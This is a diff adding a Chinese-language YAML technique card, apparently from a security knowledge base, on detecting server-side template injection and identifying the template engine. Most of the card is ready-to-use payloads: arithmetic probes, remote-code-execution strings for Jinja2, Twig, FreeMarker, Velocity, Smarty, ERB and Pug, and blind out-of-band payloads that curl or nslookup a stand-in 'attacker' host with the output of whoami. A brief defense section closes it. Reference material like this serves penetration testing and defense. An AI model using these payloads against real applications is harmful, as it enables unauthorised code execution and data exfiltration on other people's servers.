@@ -1,0 +1,94 @@
+# 技术卡片: SSTI - 通用检测与引擎识别
+# 分类: ssti / detection
+# 版本: 1.0
+# 日期: 2026-07-21
+# 来源: SecAtlas KB-SSTI-10
+
+id: "ssti-detection"
+name: "SSTI 通用检测与引擎识别"
+category: "ssti"
+subcategory: "detection"
+severity: "high"
+
+description: |
+  使用多模板引擎的数学表达式探针识别目标使用的模板引擎，
+  确定引擎后应用该引擎的特定 RCE payload。
+
+trigger_signals:
+  - "用户输入被渲染为模板输出"
+  - "邮件模板/报表/自定义页面功能"
+  - "输入 ${{<%[%'\"}} 后页面报错或语法变更"
+
+payloads:
+
+detection_probes:
+  jinja2_twig:
+    probe: "{{7*7}}"
+    positive: "返回 49"
+    engines: ["Jinja2 (Python)", "Twig (PHP)", "Handlebars (Node.js)"]
+  freemarker_velocity:
+    probe: "${7*7}"
+    positive: "返回 49"
+    engines: ["FreeMarker (Java)", "Velocity (Java)"]
+  erb_ejs:
+    probe: "<%= 7*7 %>"
+    positive: "返回 49"
+    engines: ["ERB (Ruby)", "EJS (Node.js)"]
+  pug_jade:
+    probe: "#{7*7}"
+    positive: "返回 49"
+    engines: ["Pug/Jade (Node.js)"]
+  smarty:
+    probe: "{7*7}"
+    positive: "返回 49"
+    engines: ["Smarty (PHP)"]
+
+engine_specific_approach:
+  Jinja2_Python:
+    - "{{''.__class__.__mro__[1].__subclasses__()}} → subprocess.Popen"
+  Twig_PHP:
+    - "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"
+  FreeMarker_Java:
+    - "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}"
+  Velocity_Java:
+    - "#set($rt=$class.forName('java.lang.Runtime'))#set($ex=$rt.getRuntime().exec('id'))$ex"
+  Smarty_PHP:
+    - "{php}echo shell_exec('id');{/php}"
+  ERB_Ruby:
+    - "<%= system('id') %>"
+  Pug_Node:
+    - "#{global.process.mainModule.require('child_process').execSync('id').toString()}"
+  Handlebars_Node:
+    - "通过 this.constructor.constructor 获取 Function 构造器"
+
+blind_ssti:
+  oob:
+    - "{{ ''.__class__.__mro__[1].__subclasses__()[X]('curl http://attacker/$(whoami)',shell=True) }}"
+    - "${ex('nslookup $(whoami).attacker.com')}"
+  time_delay:
+    - "{{ ''.__class__.__mro__[1].__subclasses__()[X]('sleep 10',shell=True) }}"
+
+error_fingerprinting:
+  - "jinja2.exceptions.UndefinedError → Jinja2"
+  - "freemarker.core.InvalidReferenceException → FreeMarker"
+  - "Twig_Error_Syntax → Twig"
+  - "org.apache.velocity.exception → Velocity"
+
+success_indicators:
+  - "至少一个探针返回 49"
+  - "错误消息泄露引擎名称和版本"
+  - "OOB callback 或时间延迟确认盲 SSTI"
+
+prerequisites:
+  - "应用将用户输入渲染为模板"
+  - "模板引擎未使用沙箱模式"
+
+defense:
+  - "永不将用户输入作为模板引擎输入"
+  - "如需用户自定义模板，提供受限 DSL"
+  - "沙箱化模板环境"
+
+sources:
+  - kb: "KB-SSTI-10"
+  - ref: "PortSwigger: SSTI Decision Tree"
+  - ref: "PayloadsAllTheThings: SSTI Detection"
